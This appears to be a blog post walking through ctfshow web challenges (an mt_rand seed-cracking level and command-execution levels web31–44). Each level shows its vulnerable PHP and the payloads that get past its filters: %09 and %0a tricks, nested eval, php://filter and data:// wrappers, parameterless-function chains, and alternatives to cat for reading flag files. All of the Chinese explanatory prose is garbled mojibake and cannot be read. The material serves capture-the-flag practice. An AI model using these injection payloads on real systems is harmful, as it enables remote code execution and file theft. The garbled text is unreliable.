variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$rand</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mt_scrand(seed)Ëøô‰∏™ÂáΩÊï∞ÁöÑÊÑèÊÄùÔºåÊòØÈÄöËøáÂàÜÂèëseedÁßçÂ≠êÔºåÁÑ∂ÂêéÁßçÂ≠êÊúâ‰∫ÜÂêéÔºåÈù†mt_rand()ÁîüÊàêÈöèÊú∫Êï∞„ÄÇ<br>ËøôÈáåÊ≤°ÊúâÊòéÁ°ÆÁªôÂá∫seedÔºåÂõ†Ê≠§Êàë‰ª¨ÈúÄË¶ÅÁî®Â∑•ÂÖ∑ÈÄÜÊé®Âá∫seed„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>‰ªéËøôÈáåÊàë‰ª¨ÂèØ‰ª•Âà§Êñ≠Âá∫ÔºåÂ¶ÇÊûúÊàë‰ª¨ËæìÂÖ•ÁöÑr‰∏∫0ÔºåÈÇ£‰πà$rand‰∏∫Á¨¨‰∏Ä‰∏™ÈöèÊú∫Êï∞ÁöÑË¥üÊï∞ÔºåÂπ∂‰∏îÂõ†‰∏∫ÈùûÈõ∂ÔºåÂú®ifÂà§Êñ≠‰∏≠‰ºöÂú®else‰∏≠ËæìÂá∫ÔºåÂõ†Ê≠§Êàë‰ª¨ÂÖàGETËæìÂÖ•?r&#x3D;0ÔºåÂæóÂà∞Á¨¨‰∏Ä‰∏™ÈöèÊú∫Êï∞ÁöÑË¥üÊï∞„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/20875749074848f196d6b7b1fdc4ef49.png" alt="25"><br>ËôöÊãüÊú∫ÊâìÂºÄÁªàÁ´ØËæìÂÖ•lsÊü•ÁúãÔºåÂæóÂà∞Êñá‰ª∂php_mt_seedÔºåËæìÂÖ•* .&#x2F;php_mt_seedÁ¨¨‰∏Ä‰∏™ÈöèÊú∫Êï∞*<br>bpÊäìÂåÖrepeaterÂêésend‰∏∫php7.0‰ª•‰∏äÁâàÊú¨<br><img src="https://img-blog.csdnimg.cn/7d7b0b2bcd994279b5a64993de43eb05.png" alt="25"><br>ËøôÈáåÊúâ‰∏â‰∏™ÔºàÁî®php7.0ÁâàÊú¨‰ª•‰∏äËøêË°å‰ª£Á†Å)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">3095355977</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>‰∏âÁßçÂèØËÉΩÈÉΩËØï‰∏Ä‰∏ãÔºå<br><img src="https://img-blog.csdnimg.cn/b91295d5b03f466fa046b44d34f332cd.png" alt="25"><br>ÈÄöËøá‰ª£Á†Å:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>‰ª§r&#x3D;1374935140ÂèØ‰ª•‰ΩøÂæó!$rand‰∏∫Áúü,ÁÑ∂ÂêéÊâßË°åifËØ≠Âè•ÔºåÂ¶ÇÊûúcookie‰º†ÂÖ•ÂÄºÊ≠£Á°ÆÔºåÂæóÂá∫flag„ÄÇ<br>Âà©Áî®hackbarËøõË°åget‰º†ÂèÇÔºåËøõË°åcookie‰º†ÂèÇÂæóÂà∞flag„ÄÇ</p><h2 id="ÂëΩ‰ª§ÊâßË°åÁØá"><a href="#ÂëΩ‰ª§ÊâßË°åÁØá" class="headerlink" title="ÂëΩ‰ª§ÊâßË°åÁØá"></a>ÂëΩ‰ª§ÊâßË°åÁØá</h2><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:49:10# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÖ∂‰∏≠Êúâ‰∏ÄÈÉ®ÂàÜÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ÈÄöËøáGET‰º†ÂèÇÁöÑÊñπÂºè‰º†ÂÖ•cÔºå‰º†ÂÖ•cÁöÑÂÜÖÂÆπ‰∏≠ËøáÊª§Êéâ‰∫Üflag system  php cat sort shell Ëã±ÊñáÂè•Âè∑Ôºà.Ôºâ Á©∫Ê†ºÔºà Ôºâ ÂçïÂºïÂè∑Ôºà‚ÄôÔºâ„ÄÇÈÇ£‰πàÊàë‰ª¨ÂèØ‰ª•Êâæ‰∏Ä‰∫õÂíå‰ªñ‰ª¨ÂäüËÉΩÁõ∏‰ººÁöÑÂëΩ‰ª§„ÄÇ<br>       ÊØîÂ¶ÇÔºö<br>‰∏é**system()<strong>ÂäüËÉΩÁõ∏‰ººÁöÑÂëΩ‰ª§Êúâ</strong>exec()<strong>„ÄÅ</strong>passthru()<strong>„ÄÅ</strong>shell_exec()**„ÄÇ<br>‰∏écatÂëΩ‰ª§ÂäüËÉΩÁõ∏‰ººÁöÑÂëΩ‰ª§Ôºö</p><p><em>more:‰∏ÄÈ°µ‰∏ÄÈ°µÁöÑÊòæÁ§∫Ê°£Ê°àÂÜÖÂÆπ<br>less:‰∏é more Á±ª‰ºº<br>head:Êü•ÁúãÂ§¥Âá†Ë°å<br>tac:‰ªéÊúÄÂêé‰∏ÄË°åÂºÄÂßãÊòæÁ§∫ÔºåÂèØ‰ª•ÁúãÂá∫ tac ÊòØ cat ÁöÑÂèçÂêëÊòæÁ§∫<br>tail:Êü•ÁúãÂ∞æÂá†Ë°å<br>nlÔºöÊòæÁ§∫ÁöÑÊó∂ÂÄôÔºåÈ°∫‰æøËæìÂá∫Ë°åÂè∑<br>od:‰ª•‰∫åËøõÂà∂ÁöÑÊñπÂºèËØªÂèñÊ°£Ê°àÂÜÖÂÆπ<br>vi:‰∏ÄÁßçÁºñËæëÂô®ÔºåËøô‰∏™‰πüÂèØ‰ª•Êü•Áúã<br>vim:‰∏ÄÁßçÁºñËæëÂô®ÔºåËøô‰∏™‰πüÂèØ‰ª•Êü•Áúã<br>sort:ÂèØ‰ª•Êü•Áúã<br>uniq:ÂèØ‰ª•Êü•Áúã<br>file -f:Êä•ÈîôÂá∫ÂÖ∑‰ΩìÂÜÖÂÆπ<br>sh &#x2F;flag 2&gt;%261 &#x2F;&#x2F;Êä•ÈîôÂá∫Êñá‰ª∂ÂÜÖÂÆπ</em></p><p>Á©∫Ê†ºË¢´ËøáÊª§ÊéâÂèØ‰ª•Áî®%09‰ª£Êõø„ÄÇ<br>Êàë‰ª¨get‰º†ÂÖ•**?c&#x3D;passthru(‚Äúls‚Äù);**<br><img src="https://img-blog.csdnimg.cn/b63bb7e45461489299cab133c3bc4d75.png" alt="31"><br>ÁÑ∂ÂêéÈáçÊñ∞‰º†ÂÖ•**?c&#x3D;passthru(‚Äútac%09fla*‚Äù);<em><em>ÂæóÂà∞flag„ÄÇ<br><strong>ËøòÂèØ‰ª•Ôºö</strong><br>       1 &gt;‰ΩøÁî®evalÂµåÂ•ó„ÄÇÂÖ∑‰ΩìÂèÇÊï∞Ôºöpassthru ÁªìÂêà%09<br>ÂÖ∂‰∏≠%09ÁªïËøáÁ©∫Ê†º ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(‚Äútac%09fla</em>‚Äú); ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÊã¨Âè∑ÁöÑÈó≠ÂêàÔºå&amp;ÁöÑËøûÊé•„ÄÇ<br>       2&gt; ‰ΩøÁî®pos(localeconv)Êù•Ëé∑ÂèñÂ∞èÊï∞ÁÇπ<br><strong>localeconv</strong>ÂèØ‰ª•ËøîÂõûÂåÖÊã¨Â∞èÊï∞ÁÇπÂú®ÂÜÖÁöÑ‰∏Ä‰∏™Êï∞ÁªÑÔºõ</em><em>pos<strong>ÂéªÂèñÂá∫Êï∞ÁªÑ‰∏≠ÂΩìÂâçÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†Ôºå‰πüÂ∞±ÊòØÂ∞èÊï∞ÁÇπ„ÄÇ <strong>scandir</strong>ÂèØ‰ª•ÁªìÂêàÂÆÉÊâ´ÊèèÂΩìÂâçÁõÆÂΩïÂÜÖÂÆπ„ÄÇ <strong>?c&#x3D;print_r(scandir(pos(localeconv())));</strong> ÂèØ‰ª•ÁúãÂà∞ÂΩìÂâçÁõÆÂΩï‰∏ãÊúâflag.php ÈÄöËøá</strong>array_reverse<strong>ÊääÊï∞ÁªÑÈÄÜÂ∫èÔºåÈÄöËøánextÂèñÂà∞Á¨¨‰∫å‰∏™Êï∞ÁªÑÂÖÉÁ¥†Ôºå‰πüÂç≥flag.php ÁÑ∂Âêé</strong>?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));*</em></p><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 04:21:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂèØ‰ª•ÁúãÂà∞ÔºåË¢´ËøáÊª§ÁöÑÊõ¥Â§ö‰∫Ü</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Áî®php‰º™ÂçèËÆÆ:<br>‰º†ÂÖ•**?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php**<br>ÂæóÂà∞‰∏Ä‰∏≤base64Âä†ÂØÜËøáÁöÑÂÄº:<br><em>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7ODUxZjI3ZjgtNWY5Yy00YTZhLTg5NjctNjIwMzUwNDhmZWMwfSI7DQo&#x3D;</em><br>,ÁÑ∂ÂêéÂºÄÂßãËß£ÂØÜÂæóÂà∞</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:49:19# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:49:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctfshow&#123;851f27f8-5f9c-4a6a-8967-62035048fec0&#125;"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web-39"><a href="#web-39" class="headerlink" title="web 39"></a>web 39</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag in flag.php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">//ËøáÊª§flag</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//Ê∑ªÂä†ÂêéÁºÄ.phpÔºåÊó†ÂõûÊòæ</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøáÊª§‰∫ÜflagÔºåÈááÁî®Êñá‰ª∂ÂåÖÂê´ÁöÑÊñπÂºèÔºåÂà©Áî®data‰º™ÂçèËÆÆÔºö‰º†ÂÖ•**?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?= system("tac fla\g.php");?>**<br>ÂæóÂà∞flag„ÄÇ</p><h3 id="web-40"><a href="#web-40" class="headerlink" title="web 40"></a>web 40</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\Ôºà|\Ôºâ|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøáÊª§‰∫ÜÂÜíÂè∑Ôºå‰∏çËÉΩÁî®‰º™ÂçèËÆÆ‰∫ÜÔºåÊ≤°ÊúâËøáÊª§Ëã±ÊñáÁä∂ÊÄÅÁöÑ**()** Âíå**;**ÂèØ‰ª•ËØïËØïÁî®Êó†ÂèÇÂáΩÊï∞:<br><em><strong>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</strong></em></p><p><em><strong>c&#x3D;highlight_file(next(array_reverse(scandir(dirname(FILE)))));</strong></em><br><strong>show_source</strong> ‰∏é <strong>highlight_file</strong> ÂèØ‰ª•‰∫íÊç¢„ÄÇ<br>ÂæóÂà∞flag„ÄÇ</p><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><pre><code>&gt;/dev/null 2&gt;&amp;1&gt;ÈªòËÆ§ÊÉÖÂÜµÊòØ1Ôºå‰πüÂ∞±ÊòØÁ≠âÂêå‰∫é1&gt;/dev/null 2&gt;&amp;1„ÄÇÊÑèÊÄùÂ∞±ÊòØÊääÊ†áÂáÜËæìÂá∫ÈáçÂÆöÂêëÂà∞‚ÄúÈªëÊ¥û‚ÄùÔºåËøòÊääÈîôËØØËæìÂá∫2ÈáçÂÆöÂêëÂà∞Ê†áÂáÜËæìÂá∫1Ôºå‰πüÂ∞±ÊòØÊ†áÂáÜËæìÂá∫ÂíåÈîôËØØËæìÂá∫ÈÉΩËøõ‰∫Ü‚ÄúÈªëÊ¥û‚Äù„ÄÇË¶ÅÊÉ≥ÁªïËøáËøô‰∏™‚ÄúÈªëÊ¥û‚ÄúÔºåÈúÄË¶ÅÂæÄÈáåÈù¢‰º†ÂÖ•‰∏§‰∏™ÂèÇÊï∞Ôºåshell‰ºöÊâßË°åÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÔºåÂ∞ÜÁ¨¨‰∫å‰∏™ÂèÇÊï∞Â∏¶ÂÖ•Âà∞ÈªëÊ¥û„ÄÇ</code></pre></blockquote><p>ÊâÄ‰ª•ÊûÑÈÄ† Ôºö<br><code>?c=ls;ls(Á¨¨‰∫å‰∏™ÂèÇÊï∞ÂèØ‰ª•ÂÜôÂèØ‰ª•‰∏çÂÜôÔºå‰ΩÜ‰∏ÄÂÆöË¶ÅÂä†ÂàÜÂè∑„ÄÇ‰ª£Ë°®ÂàÜÂè∑ÂâçÈù¢ÊòØÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞„ÄÇ)</code><br>Êé•ÁùÄÁúãÂà∞flag.phpÔºåÁÑ∂ÂêéÊûÑÈÄ†<br><code>?c=tac flag.php;</code><br>ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/2df7d753a2be42d4b6167d2f62e641a9.png" alt="42"><br>ÂÖ≥‰∫é<strong>linux‰∏≠&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1Âíå2&gt;&amp;1 &gt; &#x2F;dev&#x2F;null</strong>ËØ∑<a href="https://www.cnblogs.com/kexianting/p/11630085.html">ÁÇπÂáªÈìæÊé•</a></p><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>‰∏éweb42Áõ∏ÊØîÔºåÂ∞±Â§öËøáÊª§‰∫ÜÂàÜÂè∑Âíåcat„ÄÇ</p><blockquote><p>ÂàÜÂè∑ÁöÑ‰ª£ÊõøÔºö<br>%26   %0a   ||<br>catÁöÑ‰ª£ÊõøÂ∞±ÂæàÂ§ö‰∫Ü:<br>tac tail nl  sort  uniqhead more lessÁ≠â</p></blockquote><p>ÊûÑÈÄ†Ôºö<br><code>?c=tac flag.php%0a</code><br>ÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/cd8e9c47e22b4d2186c3b65831fd18ed.png" alt="43"></p><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><p>ÊûÑÈÄ†<code>?c=tac fla\g.php%0a</code><br>flagË¢´ËøáÊª§ÔºåÁî®fla?.phpÊàñfla*Êàñfla\g.php<br><img src="https://img-blog.csdnimg.cn/cd533af3fd0546499f6ec5c5ccab36ab.png" alt="44"></p><h3 id="web45"><a href="#web45" class="headerlink" 